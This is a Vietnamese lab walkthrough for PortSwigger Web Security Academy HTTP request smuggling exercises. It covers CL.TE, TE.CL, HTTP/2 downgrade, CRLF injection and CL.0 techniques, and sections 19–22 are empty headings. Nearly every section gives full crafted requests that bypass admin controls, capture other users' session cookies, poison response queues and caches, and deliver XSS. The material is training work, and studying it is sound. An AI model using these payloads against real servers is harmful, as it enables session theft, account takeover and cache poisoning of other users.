# 1. HTTP request smuggling, basic CL.TE vulnerability
Để exploit HTTP request smuggling, ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0add002e0324d0fec01c8bee00ab0070.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
Do back-end server xác định điểm cuối của request bằng header `Transfer-Encoding`, nên ký tự `G` cuối cùng sẽ được hiểu là một phần của request tiếp theo. Khi đó, nếu ta gửi thêm một request POST, thì thực tế method của request đó sẽ là GPOST.

Submit request trên hai lần, kết quả bài lab được giải.

# 2. HTTP request smuggling, basic TE.CL vulnerability
Bài lab có front-end sử dụng TE và backend sử dụng CL, như vậy ta có thể exploit với request sau:
```
POST / HTTP/1.1
Host: 0a76006c036dbdfec4dac96100a90022.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

5a
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x
0


```
Front-end sử dụng TE nên sẽ lấy body request từ `5a` đến hết ký tự kết thúc `0`, còn back-end sử dụng CL `Content-Length: 4` nên sẽ xử lý body request chỉ có phần `5a`. Như vậy, từ `GPOST` trở đi sẽ được coi là request kế tiếp. Khi ta submit request hai lần, request đầu tiên sẽ là POST request với body `5a`, và request thứ hai sẽ là GPOST request. Như vậy, bài lab được giải thành công.

# 3. HTTP request smuggling, obfuscating the TE header
Website có front-end và back-end server đều sử dụng Transfer-Encoding, ta sẽ thử tìm cách để một trong hai server không xử lý Transfer-Encoding đúng cách.

Thử với request sau:
```
POST / HTTP/1.1
Host: 0a5600960437858ac0f3db4f0041006f.web-security-academy.net
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: x

1
G
0


```
Ta thấy lỗi `Unrecognized method G0POST`, trường hợp này chỉ xảy ra với TE.CL. Như vậy, nếu có hai Transfer-Encoding thì back-end server sẽ lấy header Transfer-Encoding thứ 2(không hợp lệ) và do đó sử dụng Content-Length thay thế, dẫn đến từ TE.TE trở thành TE.CL.

Ta cấu hình đoạn request sau:
```
POST / HTTP/1.1
Host: 0a5600960437858ac0f3db4f0041006f.web-security-academy.net
Content-Length: 3
Transfer-Encoding: chunked
Transfer-Encoding: x

29
GPOST / HTTP/1.1
Content-Length: 15

x
0


```
Sau khi submit request hai lần, website trả về lỗi "Unrecognized method GPOST`. Như vậy, bài lab được giải thành công.

# 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
Để exploit lỗ hổng CL.TE, ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0aea0014046cafbbc16d670200f60046.web-security-academy.net
Content-Length: 37
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

1
x
0

GET /haha HTTP/1.1
Foo: x
```
Với front-end server sử dụng CL, request sẽ chứa toàn bộ thông tin ở trên. Với backend-server sử dụng TE, request sẽ gồm từ `POST...` đến hết ký tự `0` (do là dấu hiệu kết thúc chunked data). Như vậy, đoạn `GET /haha...` sẽ được xử lý như một phần của request kế tiếp. Nếu request sau đó trỏ đến home page, nó sẽ trở thành:
```
GET /haha HTTP/1.1
Foo: xGET / HTTP/1.1
Host: 0aea0014046cafbbc16d670200f60046.web-security-academy.net
...
```
Và kết quả, trả về 404 Not Found. Sau khi submit request, bài lab được giải thành công.

# 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses
Để exploit lỗ hổng TE.CL, ta cấu hình đoạn request sau:
```
POST / HTTP/1.1
Host: 0a1000dc03cf46e8c17a0d0100bf009b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0


```
Với front-end sử dụng TE, toàn bộ request trên sẽ được process và chuyển về cho back-end. Do back-end sử dụng CL `Content-Length: 4`, body của request đầu tiên sẽ chỉ bao gồm `5c\r\n`, và từ `GET /404...` đến hết số `0` sẽ được coi là 1 phần của request tiếp theo. Như vậy, nếu request tiếp theo là `GET /` thì nó sẽ trở thành:
```
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0GET / HTTP/1.1
Host: 0a1000dc03cf46e8c17a0d0100bf009b.web-security-academy.net
...
```
Và kết quả sẽ trả về 404: Not Found. Sau khi submit request, kết quả thành công.

# 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
Cấu hình đoạn request sau:
```
POST / HTTP/1.1
Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

G
```
Khi submit request hai lần, ta nhận được message "Not Found", nguyên nhân là do website có lỗi HTTP Request Smuggling khiến request thứ hai có method là GPOST.

Tiếp tục, để vào trang `/admin` thì ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
Content-Length: 32
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Foo: x
```
Sau khi submit 2 lần, ta đã truy cập vào được `/admin`, tuy nhiên response trả về lại là `401 Unauthorized` với message "Admin interface only available to local users". Sau khi thử thêm các header `X-Host`, `X-Forwarded-For`, ... để giả localhost nhưng không thành công, ta sẽ thử thay đổi header `Host`. Tuy nhiên, khi thêm header `Host: localhost` vào bên dưới dòng `GET /admin HTTP/1.1` thì sẽ hiển thị lỗi "Duplicate header names are not allowed". 

Để khắc phục vấn đề này, ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
Content-Length: 67
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Khi đó, nếu ta submit lần thứ 2 thì request được gửi sẽ trở thành:
```
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=POST / HTTP/1.1
Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
...
```
Như ta thấy, `Host` header thứ 2 đã được chuyển vào body nên không còn bị lỗi trùng header `Host` nữa. Sau khi submit, ta đến được trang `/admin`. Tiếp tục tương tự truy cập `/admin/delete?username=carlos`, kết quả thành công.

# 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
Thử submit request sau hai lần:
```
POST / HTTP/1.1
Host: 0a60008904904433c0c631a900340080.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

1
X
0


```
Lần thứ hai hiển thị lỗi 404 Not Found. Như vậy website có lỗi TE.CL, nên back-end server đã coi ký tự `X` là 1 phần của request tiếp theo, dẫn đến method trở thành `XPOST` => Not Found

Để exploit TE.CL vào trang `/admin` ta cấu hình request như sau:
```
POST / HTTP/1.1
Host: 0a60008904904433c0c631a900340080.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

5e
GET /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0


```
Ta đã access được đến `/admin` trên back-end server, tuy nhiên lại được trả về lỗi "Admin interface only available to local users". Ta sẽ fake localhost bằng cách thay đổi Host header.
```
POST / HTTP/1.1
Host: 0a60008904904433c0c631a900340080.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

5e
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0


```
Kết quả, truy cập trang admin thành công. Để xóa user carlos, ta submit request tương tự đến `/admin/delete?username=carlos`. Như vậy bài lab được giải.

# 8. Exploiting HTTP request smuggling to reveal front-end request rewriting
Sử dụng Burp Repeater, submit request sau:
```
POST / HTTP/1.1
Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Transfer-Encoding: chunked

1
x
0

G
```
Ta thấy xuất hiện lỗi "Not Found", dấu hiệu rằng website có lỗ hổng CL.TE. Thử exploit HRS để gửi request đến `/admin` thì response trả về 401 Unauthorized. Như vậy, ta cần tìm tên header mà server sử dụng để xác định địa chỉ IP nhằm fake localhost.

Trong website có chức năng search, search key được reflected trong response. Như vậy, ta cấu hình request như sau:
```
POST / HTTP/1.1
Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 183
Transfer-Encoding: chunked

c
search=triet
0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
Content-Length: 100

search=
```
Request trên sẽ exploit HRS, khiến cho search term có giá trị là các header được front-end server thêm vào. Sau khi submit hai lần, ta thấy response trả về có thông tin mong muốn:

![image](https://user-images.githubusercontent.com/103978452/225247897-6494bdd0-3ce9-427a-9c1a-2084dae970ad.png)

Như vậy, server sử dụng header `X-TXovCK-Ip` để xác định địa chỉ IP. Ta cấu hình request bên dưới để vào trang admin:
```
POST / HTTP/1.1
Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 206
Transfer-Encoding: chunked

c
search=triet
0

GET /admin HTTP/1.1
X-TXovCK-Ip: 127.0.0.1
Host: 0ae5008d0360ebc0c1a75305003100bd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

x=
```
Sau khi submit 2 lần, ta truy cập trang admin thành công. Tiếp đó, để xóa user carlos, ta thực hiện cách tương tự với request `GET /admin/delete?username=carlos`. Kết quả, bài lab được giải.

# 9. Exploiting HTTP request smuggling to capture other users' requests
Thử submit request sau:
```
POST / HTTP/1.1
Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Transfer-Encoding: chunked

1
x
0

X
```
Submit 3 lần ta thấy response trả về "Not Found", dấu hiệu cho thấy website có lỗ hổng CL.TE. Nhận thấy trong website có chức năng comment, để bắt request của user khác ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 296
Transfer-Encoding: chunked

1
x
0

POST /post/comment HTTP/1.1
Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

csrf=9JtAo1TnsWjcposKCSyjNbXvR0uurKQK&postId=9&name=test&email=test%40gmail.com&website=https%3A%2F%2Ftest.com&comment=
```
Khi đó, nội dung comment của smuggled request sẽ trở thành các header của request tiếp theo. Sau khi submit, ta truy cập `GET /post?postId=9` thì thấy comment:

![image](https://user-images.githubusercontent.com/103978452/225261015-41a9bff4-7464-41ad-8223-5d014f18d49f.png)

Tuy nhiên nhận thấy Cookie header vẫn chưa có trong comment. Như vậy ta cần điều chỉnh Content-Length trong smuggled request để có thể thấy được Cookie của user.

Sau một vài lần thử, ta có request cuối cùng như sau:
```
POST / HTTP/1.1
Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 340
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
Cookie: session=bvniqBliOdRmqDH9ch1CrJe8exJpXD6h
Content-Type: application/x-www-form-urlencoded
Content-Length: 916

csrf=9JtAo1TnsWjcposKCSyjNbXvR0uurKQK&postId=9&name=damn&email=test%40gmail.com&website=https%3A%2F%2Ftest.com&comment=
```
Submit request, đợi một thời gian để user gửi request rồi refresh trang bài viết, ta thấy comment sau:

![image](https://user-images.githubusercontent.com/103978452/225258173-1c4d581d-9832-40a8-ad7e-cfb5b1d85081.png)

Như vậy, ta lấy được session của user `session=VyERtqn8lwKR4QWQdHAHaRjcSrWmeYhi`. Thay thế với cookie hiện tại rồi refresh, kết quả thành công.

# 10. Exploiting HTTP request smuggling to deliver reflected XSS
Gửi request `GET /post/post?id=7` với header `User-Agent: damn` thì thấy response có reflect giá trị này: `<input required type="hidden" name="userAgent" value="damn">`. Như vậy để exploit XSS, ta chỉ cần thay đổi header `User-Agent: "><script>alert(1)</script>`

Do website có lỗ hổng CL.TE, ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0a590080042cebcfc157803700d5002a.web-security-academy.net
User-Agent: damn
Content-Length: 213
Transfer-Encoding: chunked

0

GET /post?postId=7 HTTP/1.1
Host: 0a590080042cebcfc157803700d5002a.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```
Sau khi submit request trên, smuggled request sẽ là `GET /post?postId=7` với header User-Agent bị thay đổi để exploit reflected XSS. Kết quả, bài lab được giải thành công.

# 11. Response queue poisoning via H2.TE request smuggling
Cấu hình request:
```
POST / HTTP/2
Host: 0ad7006603aaa96fc04740b000db00ee.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 113

0

GET /404 HTTP/1.1
Host: 0ad7006603aaa96fc04740b000db00ee.web-security-academy.net
Content-Length: 5

x=1
```
Sau khi submit hai lần, response trả về `HTTP/2 404 Not Found`. Như vậy, website có lỗ hổng H2.TE.

Tiếp tục, ta cấu hình request sau:
```
POST / HTTP/2
Host: 0ad7006603aaa96fc04740b000db00ee.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 101

0

GET /post?postId=2 HTTP/1.1
Host: 0ad7006603aaa96fc04740b000db00ee.web-security-academy.net


```
Request trên sẽ được back-end server xử lý như hai request: `POST /` và `GET /post?postId=2`. Quá trình exploit như sau:
1) Submit request, respose của `POST /` được trả về và response của `GET /post?postId=2` được đặt ở vị trí đầu tiên trong response queue
2) Khi victim login, trong response trả về sẽ có header `Set-Cookie` với session mới của victim. Tuy nhiên, response trả về cho victim sẽ là response của `GET /post?postId=2`, do nó nằm ở vị trí đầu trong queue. Sau đó, response cho request logic của victim được đẩy lên đầu response queue.
3) Gửi lại request một lần nữa, ta nhận được response cho request login của victim. Do đó, thay vì nhận được response của `POST /`, ta sẽ nhận được response có chứa session mới của victim sau khi login.

![image](https://user-images.githubusercontent.com/103978452/226150791-5e411eb8-0071-4117-9f67-4fef56c2dd77.png)

Ta thu được `session=yOLaDKQeiNN0jKkPQcPmaQXuQAtNfVKC`. Thay thế với session hiện tại, access vào admin panel và xóa user carlos. Kết quả, bài lab được giải thành công.

# 12. H2.CL request smuggling
Cấu hình request:
```
POST / HTTP/2
Host: 0a8f008704dfb560c0c11d910059000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /404 HTTP/1.1
Host: 0a8f008704dfb560c0c11d910059000c.web-security-academy.net
Content-Length: 10

x=1
```
Khi submit 2 lần, ta nhận được response `HTTP/2 404 Not Found`. Như vậy, website có lỗ ổng H2.CL.

Nhận thấy khi ta gửi request `GET /resources` đến server, response sẽ là:
```
HTTP/2 302 Found
Location: https://0a8f008704dfb560c0c11d910059000c.web-security-academy.net/resources/
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
Do đó, nếu ta thay đổi header `Host: <exploit-server>`, ta có thể khiến user redirect tới resources nằm trong exploit server. Vào exploit server và thay đổi đoạn javascript thành `alert(document.cookie)`, sau đó cấu hình request sau:
```
POST / HTTP/2
Host: 0a8f008704dfb560c0c11d910059000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0aae00220498b590c0a21c8901f000e7.exploit-server.net
Content-Length: 10

x=1
```
Thử submit hai lần, ta thấy response thứ hai có header `Location: https://exploit-0aae00220498b590c0a21c8901f000e7.exploit-server.net/resources/`. Như vậy, nếu ta có thể khiến user gửi request này dưới dạng một request yêu cầu javascript, thì lệnh `alert` sẽ được execute.

Submit request sao cho đúng vào thời điểm sau khi browser của victim load website, và chuẩn bị load javascript resources. Kết quả, bài lab được giải thành công.

# 13. HTTP/2 request smuggling via CRLF injection
Sử dụng BurpRepeater và Inspector, cấu hình request sau:
```
POST / HTTP/2
Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
Content-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

x=1
```
Sau khi submit request hai lần, response trả về `HTTP/2 404 Not Found`. Như vậy website có lỗ hổng H2.TE. Nhận thấy trong website có chức năng tìm kiếm, và hiển thị lịch sử tìm kiếm. Request cho chức năng search như sau:
```
POST / HTTP/2
Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
Cookie: session=LX6T5Olh6WCNd4gUkWU3OVUAGfxBW3Zr;
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

search=hello
```
Như vậy, ta có thể lợi dụng chức năng này để đọc HTTP request của user khác. Cấu hình request bên dưới:
```
POST / HTTP/2
Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
Content-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 0abf007403377d94c0de3bb500450013.web-security-academy.net
Cookie: session=LX6T5Olh6WCNd4gUkWU3OVUAGfxBW3Zr
Content-Length: 100
Content-Type: application/x-www-form-urlencoded

search=
```
Sau khi submit, đợi 15s để user gửi request rồi refresh trang lịch sử tìm kiếm, ta thu được response có chứa một phần HTTP request của user. Thực hiện điều chỉnh Content-Length từ 100 thành các giá trị lớn hơn sao cho lấy được session cookie của victim (cuối cùng, `Content-Length: 1000` là hợp lý). Ta được kết quả bên dưới:

![image](https://user-images.githubusercontent.com/103978452/226163977-50271311-4413-432e-9b8f-8093eca51719.png)

Thay thế session cookie của mình thành session cookie thu được, kết quả bài lab được giải thành công.
# 14. HTTP/2 request splitting via CRLF injection
Cấu hình request sau:
```
POST / HTTP/2
Host: 0a2a00b104eb10fcc0e8ef3800610024.web-security-academy.net
Content-Length: 0
Content-Type: application/x-www-form-urlencoded


```
Sau đó sử dụng Inspector để thay đổi header `Content-Type` có value là 
```
application/x-www-form-urlencoded\r\nGET /404 HTTP/1.1\r\nHost: 0a2a00b104eb10fcc0e8ef3800610024.web-security-academy.net
```
Submit requets hai lần, kết quả trả về response `HTTP/2 404 Not Found`. Đó là do quá trình downgrade HTTP/2 xuống HTTP/1 đã tách request header trên thành hai request riêng biệt là
```
POST / HTTP/2
Host: 0a2a00b104eb10fcc0e8ef3800610024.web-security-academy.net
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
```
và
```
GET /404 HTTP/1.1
Host: 0a2a00b104eb10fcc0e8ef3800610024.web-security-academy.net
```
Như vậy, ta có thể exploit HRS để gửi hai request một lúc. Ta exploit như sau:
1) Gửi request trên, website sẽ trả về response của `POST /` và đẩy response của `GET /404` lên đầu response queue.
2) Khi user login, response user nhận được sẽ là `HTTP/2 404 Not Found`, và response login của user sẽ được đẩy lên đầu response queue
3) Ta submit request lần thứ hai, khi đó response nhận được sẽ là response từ request login của user.

Kết quả, ta thu được:

![image](https://user-images.githubusercontent.com/103978452/226235744-85ffdd9f-1acc-47e6-ba45-a644e82694c3.png)

Thay thế session cookie hiện tại bằng session cookie thu được, sau đó vào admin panel xóa user carlos. Kết quả thành công.
# 15. CL.0 request smuggling
Cấu hình request sau:
```
GET /image/blog/posts/18.jpg HTTP/1.1
Host: 0a86009f047d6207c087bd7400310014.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

xxGET /admin HTTP/1.1
Foo: x
```
Sau khi submit hai lần, ta nhận được response `Backend only accepts methods GET, POST, HEAD`. Như vậy, với các resources là images, website có lỗ hổng CL.0.

Thay đổi smuggled request thành `GET /admin`, ta có thể truy cập admin panel. Sau đó đặt smuggled request là `GET /admin/delete?username=carlos`, kết quả bài lab được giải thành công.

# 16. Exploiting HTTP request smuggling to perform web cache poisoning
Cấu hỉnh request sau:
```
POST / HTTP/1.1
Host: 0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net
Content-Length: 130
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```
Sau khi submit hai lần, ta được response `HTTP/1.1 404 Not Found`, là dấu hiệu cho thấy website có lỗ hổng CL.TE.

Nhận thấy trong website có chức năng "Next post", khi gửi request `GET /post/next?postId=4 HTTP/1.1` ta được response:
```
HTTP/2 302 Found
Location: https://0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net/post?postId=5
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
Như vậy, website có sử dụng absolute URL trong header Location. Ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net
Content-Length: 128
Transfer-Encoding: chunked

0

GET /post/next?postId=4 HTTP/1.1
Host: 0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net
Content-Length: 10

x=
```
Response trả về với header `Location: https://0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net/post?postId=5`. Như vậy, ta có thể thay đổi Host header để tạo response redirect về exploit server. Đồng thời, nhận thấy với request `/resources/js/tracking.js` thì có cache được sử dụng.

Vào exploit server, cấu hình javascript với content `alert(document.cookie)` rồi để Path là `/post?postId=5`. Ta tiến hành như sau:
1) Gửi request trên khiến cho smuggled request (request tiếp theo) sẽ trả về response redirect tới exploit server
2) Đợi đến khi cache hết hạn rồi gửi request `/resources/js/tracking.js`, request header sẽ trở thành body của smuggled request và khiến response là response redirect trong bước 1. Response này sẽ được lưu trong cache
3) Khi user load file javascript tracking.js, response trong cache sẽ được trả về và redirect tới exploit server.

![image](https://user-images.githubusercontent.com/103978452/226513945-a8d1dce6-254e-41a6-98f2-3551274d399d.png)

Làm các bước như trên, kết quả thành công.

# 17. Exploiting HTTP request smuggling to perform web cache deception
Website có lỗi CL.TE. Nhận thấy:
+) Response của request `GET /my-account` có chứa apiKey
+) Request `GET /resources/js/tracking.js` có sử dụng cache

Cấu hình request (1):
```
POST / HTTP/1.1
Host: 0a550057037bf777c4ce9e1b00cc00f2.web-security-academy.net
Content-Length: 37
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Foo: x
```
Request trên sẽ khai thác HRS, smuggled request sẽ trả về response chứa apiKey.

Ta có thể exploit theo các bước sau:
1) Đợi đến khi cache hết hạn và đợi đến khi user gửi request tới home page, nhưng chưa kịp gửi request đến file tracking.js. Khi đó, ta gửi request (1), smuggled request sẽ khiến request tiếp theo gửi đến server trở thành `GET /my-account`.
2) Khi browser của victim gửi request `GET /resources/js/tracking.js`, server sẽ xử lý smuggled request với credentials của victim. Sau đó, response được lưu vào trong cache.
3) Ta gửi request `/resources/js/tracking.js` để kiểm tra kết quả, nếu thành công thì response sẽ trả về trang "My account" của victim.

![image](https://user-images.githubusercontent.com/103978452/226516072-ba764fed-e6de-4823-93fa-1ac53fbf2798.png)

Thử lặp lại các bước trên một vài lần, kết quả bài lab được giải thành công.

# 18. Bypassing access controls via HTTP/2 request tunnelling
Website có chức năng search và từ khóa tìm kiếm được reflected trong response. Đồng thời, nếu ta gửi request `POST /` với parameter `search` thì có thể thực hiện chức năng này. Cấu hình request sau:
```
POST / HTTP/2
Host: 0a4e007303c14266c11809b80018007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
foo: bar


```
Sau đó, sử dụng Inspector để thay đổi header `Foo: bar`, sao cho Name  (Foo) của nó trở thành:
```
foo: bar\r\n
Content-Length: 125\r\n
\r\n
search=
```
Thiết lập value=`bar` và body=`hellohellohellohellohellohellohellohello`. Khi front-end server đọc requests trên, nó sẽ hiểu là request thông thường (do sử dụng HTTP/2), thêm các internal headers và chuyển về cho back-end server. Khi back-end server thực hiện HTTP/2 downgrading, request sẽ trở thành:
```
POST / HTTP/2
Host: 0a4e007303c14266c11809b80018007e.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
foo: bar
Content-Length: 125

search=<Internal headers>

hellohellohellohellohellohellohellohello
```
Và khi đó, internal headers sẽ được reflected trong response của chức năng search. Sau khi submit, ta thấy thông tin các headers mong muốn:

![image](https://user-images.githubusercontent.com/103978452/227083222-c2864734-e1da-4514-ad3a-f3c3b7f2339b.png)

Tiếp đó, dùng Inspector thay đổi Name của header `foo` như sau:
```
foo: bar\r\n
Content-Length: 125\r\n
X-SSL-VERIFIED: 1\r\n
X-SSL-CLIENT-CN: administrator\r\n
X-FRONTEND-KEY: 9940633528943809\r\n
\r\n
search=
```
Ta dự đoán back-end server sẽ sử dụng 3 internal headers để kiểm tra quyền. Như vậy khi thay đổi như trên, có thể ta sẽ thực hiện được các hành động dưới tư cách administrator. Đổi path thành `/admin` rồi submit, ta access trang admin thành công. 

![image](https://user-images.githubusercontent.com/103978452/227084505-9c60ce9d-64f8-4d67-be15-07615531f9df.png)

Thay đổi path thành `/admin/delete?username=carlos`, kết quả bài lab được giải thành công.

# 19. Web cache poisoning via HTTP/2 request tunnelling

# 20. Client-side desync

# 21. Browser cache poisoning via client-side desync

# 22. Server-side pause-based request smuggling
